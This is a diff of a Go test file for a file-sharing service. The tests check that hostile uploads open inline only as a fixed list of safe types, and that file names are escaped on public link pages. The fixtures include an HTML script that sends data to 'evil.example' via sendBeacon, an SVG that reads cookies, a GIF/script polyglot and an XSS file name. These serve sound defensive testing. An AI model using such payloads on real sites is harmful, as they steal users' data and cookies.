@@ -28,8 +28,13 @@ type sent struct {
 }
 
 // headersOf checks the headers every answer with a file's bytes carries, and returns the ones that depend on the file.
-func headersOf(t *testing.T, what string, res harness.Response, name string, content []byte) sent {
+// The Referrer-Policy is same-origin for members, and no-referrer under the public prefix (given then).
+func headersOf(t *testing.T, what string, res harness.Response, name string, content []byte, referrer ...string) sent {
 	t.Helper()
+	policy := "same-origin"
+	if len(referrer) > 0 {
+		policy = referrer[0]
+	}
 	if res.Status != http.StatusOK {
 		t.Fatalf("%s: got %d %s", what, res.Status, res.Body)
 	}
@@ -40,7 +45,7 @@ func headersOf(t *testing.T, what string, res harness.Response, name string, con
 		"X-Content-Type-Options":       "nosniff",
 		"Cross-Origin-Resource-Policy": "same-origin",
 		"Cache-Control":                "private, no-store",
-		"Referrer-Policy":              "same-origin",
+		"Referrer-Policy":              policy,
 		"Accept-Ranges":                "bytes",
 	} {
 		if got := res.Header.Values(header); len(got) != 1 || got[0] != want {
@@ -59,30 +64,28 @@ func headersOf(t *testing.T, what string, res harness.Response, name string, con
 
 var downloaded = sent{"application/octet-stream", "attachment", sandboxedPolicy}
 
-// Only a fixed list of kinds opens in the browser, decided by the extension of the name and nothing else, each with
-// the one content type the list gives it, under a policy that lets nothing run. Everything else, web pages and SVG
-// images included, is sent to be saved. A download is always sent to be saved, whatever it is and however it is asked
-// for. The files here are hostile: what they hold is a web page with a script, whatever their name says.
-func TestOnlyAFixedListOfKindsOpensInTheBrowser(t *testing.T) {
-	t.Parallel()
-	d := harness.Start(t, reka)
-	placeID, _ := myFiles(t, d, reka)
-	c := d.As(reka)
-
-	page := []byte(`<!doctype html><html><body><script>fetch("/api/places").then(r => r.text()).then(t => navigator.sendBeacon("https://evil.example", t))</script></body></html>`)
-	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>`)
+// The hostile files the tests upload: what they hold is a web page with a script (or an SVG image, or a GIF that is
+// also a script and a page), whatever their name says, and how each must be sent from …/open.
+var (
+	hostilePage = []byte(`<!doctype html><html><body><script>fetch("/api/places").then(r => r.text()).then(t => navigator.sendBeacon("https://evil.example", t))</script></body></html>`)
+	hostileSVG  = []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>`)
 	// A GIF that is also a script and a page: browsers have run such files as HTML when they guessed the type.
-	polyglot := []byte("GIF89a/*\x01\x00\x01\x00\x00\xff\xff\xff*/=1;alert(document.domain)//<html><script>alert(1)</script>")
+	hostilePolyglot = []byte("GIF89a/*\x01\x00\x01\x00\x00\xff\xff\xff*/=1;alert(document.domain)//<html><script>alert(1)</script>")
+)
 
+type hostileFile struct {
+	name    string
+	content []byte
+	opens   bool
+	want    sent // from …/open
+}
+
+func hostileFiles() []hostileFile {
+	page, svg, polyglot := hostilePage, hostileSVG, hostilePolyglot
 	image := func(t string) sent { return sent{t, "inline", sandboxedPolicy} }
 	media := func(t string) sent { return sent{t, "inline", playablePolicy} }
 	text := sent{"text/plain; charset=utf-8", "inline", sandboxedPolicy}
-	cases := []struct {
-		name    string
-		content []byte
-		opens   bool
-		want    sent // from …/open
-	}{
+	return []hostileFile{
 		// What the list names opens, with its own content type, whatever the file holds.
 		{"Invoice.png", page, true, image("image/png")},
 		{"Photo.jpg", page, true, image("image/jpeg")},
@@ -142,6 +145,19 @@ func TestOnlyAFixedListOfKindsOpensInTheBrowser(t *testing.T) {
 		{"png", page, false, downloaded},
 		{"Photo", page, false, downloaded},
 	}
+}
+
+// Only a fixed list of kinds opens in the browser, decided by the extension of the name and nothing else, each with
+// the one content type the list gives it, under a policy that lets nothing run. Everything else, web pages and SVG
+// images included, is sent to be saved. A download is always sent to be saved, whatever it is and however it is asked
+// for. The files here are hostile: what they hold is a web page with a script, whatever their name says.
+func TestOnlyAFixedListOfKindsOpensInTheBrowser(t *testing.T) {
+	t.Parallel()
+	d := harness.Start(t, reka)
+	placeID, _ := myFiles(t, d, reka)
+	c := d.As(reka)
+	page, svg := hostilePage, hostileSVG
+	cases := hostileFiles()
 	ids := map[string]int64{}
 	for _, f := range cases {
 		// The upload says it is a web page; the Drive never takes a type from it.
@@ -275,4 +291,47 @@ func TestAHostileFileFromAnotherMemberOpensOnlyAsTheListSays(t *testing.T) {
 	}
 	// Réka, a project admin, cannot open Bence's My files either.
 	sameAs(t, "Réka opening Statement.pdf", d.As(reka).Get(t, openPath(x.place, inside.ID)), d.As(reka).Get(t, openPath(x.place, inside.ID+1000)))
+}
+
+// A public page is as safe as the members' pages: a hostile file a member put in a linked folder opens for a visitor
+// only as the list says, with the same content type and policy, and every download is sent to be saved; the visitor's
+// page offers Open only for what opens. A visitor's answers also never send the address on (no-referrer).
+func TestAHostileFileOpensOnlyAsTheListSaysThroughAPublicLink(t *testing.T) {
+	t.Parallel()
+	d := harness.Start(t, reka)
+	placeID, _ := myFiles(t, d, reka)
+	c, v := d.As(reka), visitor(d)
+	folder := madeFolder(t, c, placeID, 0, "From clients")
+	cases := hostileFiles()
+	ids := map[string]int64{}
+	for _, f := range cases {
+		ids[f.name] = uploadedInto(t, c.With("Content-Type", "text/html"), placeID, folder.ID, f.name, f.content).ID
+	}
+	_, page := madeLink(t, d, c, placeID, folder.ID, false)
+	listed := readPage(t, v, page)
+	for _, f := range cases {
+		if (listed.opens[f.name] != "") != f.opens {
+			t.Errorf("%q: the visitor's page offers Open %v, want %v", f.name, listed.opens[f.name] != "", f.opens)
+		}
+		res := v.Get(t, inLink(page, ids[f.name], "/open"))
+		if got := headersOf(t, "a visitor opening "+f.name, res, f.name, f.content, "no-referrer"); got != f.want {
+			t.Errorf("a visitor opening %q: sent as %+v, want %+v", f.name, got, f.want)
+		}
+		visitorHeaders(t, "a visitor opening "+f.name, res)
+		for _, ask := range []string{"", "?inline=1&disposition=inline"} {
+			res := v.With("Accept", "text/html").Get(t, inLink(page, ids[f.name], "/download")+ask)
+			if got := headersOf(t, "a visitor downloading "+f.name, res, f.name, f.content, "no-referrer"); got != downloaded {
+				t.Errorf("a visitor downloading %q (%q): sent as %+v, want %+v", f.name, ask, got, downloaded)
+			}
+		}
+	}
+	// The page itself says nothing a browser could run, whatever the names: they are text on it.
+	planted := uploadedInto(t, c, placeID, folder.ID, `"><script>alert(1)<\script><img src=x onerror=alert(2)>.txt`, []byte("x"))
+	res := v.Get(t, page)
+	if bytes.Contains(res.Body, []byte("<script>")) || bytes.Contains(res.Body, []byte("<img")) || !strings.Contains(string(res.Body), "&lt;script&gt;") {
+		t.Errorf("a name with markup on the visitor's page: %s", res.Body)
+	}
+	if res := v.Get(t, inLink(page, planted.ID, "/download")); res.Status != http.StatusOK {
+		t.Errorf("downloading the file with markup in its name: %d", res.Status)
+	}
 }
